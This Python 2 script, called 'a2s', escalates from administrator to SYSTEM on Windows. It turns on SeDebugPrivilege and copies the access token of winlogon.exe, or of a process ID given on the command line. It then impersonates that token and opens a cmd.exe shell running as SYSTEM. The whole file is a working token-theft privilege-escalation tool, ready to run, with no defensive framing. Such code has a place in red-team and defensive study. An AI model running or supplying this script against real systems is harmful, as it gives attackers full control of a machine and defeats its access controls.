from ctypes.wintypes import *
from ctypes import *
import wmi
from win32com.client import GetObject
import argparse
import sys

parser = argparse.ArgumentParser(prog="a2s",description='admin2system command execution')

#parser.add_argument("-c",dest="c",required=True,help="command")
parser.add_argument("-pid",dest="pid",help="specify a pid.")
parser.add_argument("--version", action="version", version="%(prog)s 1.0")

args = parser.parse_args()

#https://msdn.microsoft.com/en-us/library/windows/desktop/aa379261%28v=vs.85%29.aspx
class LUID(Structure):
    _fields_ = [
        ("LowPart", DWORD),
        ("HighPart", LONG),
    ]

#https://msdn.microsoft.com/en-us/library/windows/desktop/aa379263%28v=vs.85%29.aspx
class LUID_AND_ATTRIBUTES(Structure):
    _fields_ = [
        ("Luid", LUID),
        ("Attributes", DWORD),
    ]

#https://msdn.microsoft.com/en-us/library/windows/desktop/aa379630%28v=vs.85%29.aspx
class TOKEN_PRIVILEGES(Structure):
    _fields_ = [
        ("PrivilegeCount", DWORD),
        ("Privileges", LUID_AND_ATTRIBUTES),
    ]

#https://msdn.microsoft.com/en-us/library/windows/desktop/ms684873%28v=vs.85%29.aspx
class PROCESS_INFORMATION(Structure):
    _fields_ = [
        ('hProcess',    HANDLE),
        ('hThread',     HANDLE),
        ('dwProcessId', DWORD),
        ('dwThreadId',  DWORD),
    ]

#https://msdn.microsoft.com/en-us/library/windows/desktop/ms686331%28v=vs.85%29.aspx
class STARTUPINFO(Structure):
    _fields_ = [
        ('cb',              DWORD),
        ('lpReserved',      LPSTR),
        ('lpDesktop',       LPSTR),
        ('lpTitle',         LPSTR),
        ('dwX',             DWORD),
        ('dwY',             DWORD),
        ('dwXSize',         DWORD),
        ('dwYSize',         DWORD),
        ('dwXCountChars',   DWORD),
        ('dwYCountChars',   DWORD),
        ('dwFillAttribute', DWORD),
        ('dwFlags',         DWORD),
        ('wShowWindow',     WORD),
        ('cbReserved2',     WORD),
        ('lpReserved2',     LPVOID),
        ('hStdInput',       HANDLE),
        ('hStdOutput',      HANDLE),
        ('hStdError',       HANDLE),
    ]

SE_PRIVILEGE_ENABLED = 0x00000002
TOKEN_ADJUST_PRIVILEGES = 0x00000020
TOKEN_QUERY = 0x0008
PROCESS_QUERY_INFORMATION = 0x0400
MAXIMUM_ALLOWED = 0x2000000
SecurityIdentification = 2
TokenPrimary=1

OpenProcessToken=windll.advapi32.OpenProcessToken #https://msdn.microsoft.com/en-us/library/windows/desktop/aa379295%28v=vs.85%29.aspx
LookupPrivilegeValue=windll.advapi32.LookupPrivilegeValueA #https://msdn.microsoft.com/en-us/library/windows/desktop/aa379180%28v=vs.85%29.aspx
AdjustTokenPrivileges=windll.advapi32.AdjustTokenPrivileges #https://msdn.microsoft.com/en-us/library/windows/desktop/aa375202%28v=vs.85%29.aspx
GetCurrentProcess= windll.kernel32.GetCurrentProcess() #https://msdn.microsoft.com/en-us/library/windows/desktop/ms683179%28v=vs.85%29.aspx
OpenProcess=windll.kernel32.OpenProcess #https://msdn.microsoft.com/en-us/library/windows/desktop/ms684320%28v=vs.85%29.aspx
DuplicateTokenEx=windll.advapi32.DuplicateTokenEx #https://msdn.microsoft.com/en-us/library/windows/desktop/aa446617%28v=vs.85%29.aspx
ImpersonateLoggedOnUser=windll.advapi32.ImpersonateLoggedOnUser #https://msdn.microsoft.com/en-us/library/windows/desktop/aa378612%28v=vs.85%29.aspx
CreateProcessAsUserA=windll.advapi32.CreateProcessAsUserA #https://msdn.microsoft.com/en-us/library/windows/desktop/ms682429%28v=vs.85%29.aspx

def EnablePrivilege(privilegeStr, htoken=None):
	if htoken == None:
		htoken = HANDLE()
		OpenProcessToken(GetCurrentProcess, (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), byref(htoken) )
	privilege_id = LUID()
	LookupPrivilegeValue(None, privilegeStr, byref(privilege_id))
	laa = LUID_AND_ATTRIBUTES(privilege_id, SE_PRIVILEGE_ENABLED)
	tp  = TOKEN_PRIVILEGES(1, laa)
	AdjustTokenPrivileges(htoken, False, byref(tp), sizeof(tp), None, None)

def get_winlogon_pid():
	WMI = GetObject('winmgmts:')
	processes = WMI.InstancesOf('Win32_Process')
	for process in processes:
		if process.Properties_('name').Value=="winlogon.exe":
			winlogon=process.Properties_('processid').Value
	return winlogon

def get_system_token():
	if args.pid:
		process = OpenProcess(PROCESS_QUERY_INFORMATION, False, int(args.pid))
	else:
		process = OpenProcess(PROCESS_QUERY_INFORMATION, False, get_winlogon_pid())
	token = HANDLE()
	OpenProcessToken(process, MAXIMUM_ALLOWED, byref(token))
	windll.kernel32.CloseHandle(process) #https://msdn.microsoft.com/en-us/library/windows/desktop/ms724211%28v=vs.85%29.aspx
	return token

def IsAdmin():
	value=windll.Shell32.IsUserAnAdmin() #https://msdn.microsoft.com/en-us/library/windows/desktop/bb776463%28v=vs.85%29.aspx
	return value

def duplicateTokenPrimary(token):
	newToken = HANDLE()
	DuplicateTokenEx(token, MAXIMUM_ALLOWED, None, SecurityIdentification, TokenPrimary, byref(newToken))
	windll.kernel32.CloseHandle(token)
	return newToken.value
	
value=IsAdmin()
if value==0:
	print "No administrator rights."
	sys.exit(-1)

#Required to debug and adjust the memory of a process owned by another account. 	
EnablePrivilege("SeDebugPrivilege")

htoken=get_system_token()
dupToken=duplicateTokenPrimary(htoken)
print dupToken

#Required to assign the primary token of a process. (Replace a process-level token, in this case with the SYSTEM)
EnablePrivilege("SeAssignPrimaryTokenPrivilege",htoken=dupToken)
ImpersonateLoggedOnUser(dupToken)

lpProcessInformation = PROCESS_INFORMATION()
lpStartupInfo = STARTUPINFO()
lpStartupInfo.lpReserved=None
lpStartupInfo.lpDesktop="winsta0\default"
lpStartupInfo.lpTitle="Admin2System"
lpStartupInfo.dwX=500
lpStartupInfo.dwY=500

#The new process has a new console, instead of inheriting its parent's console (the default)
CREATE_NEW_CONSOLE = 0x00000010
cmd=r"c:\windows\system32\cmd.exe"
#if args.c:
ret=CreateProcessAsUserA(dupToken, cmd, None, None, None, True, CREATE_NEW_CONSOLE, None, None, byref(lpStartupInfo), byref(lpProcessInformation))
if ret==0:
	print "Create process failed." 
else:
	print "Create process succeed."

windll.advapi32.RevertToSelf() #The RevertToSelf terminates the impersonation
windll.kernel32.CloseHandle(dupToken)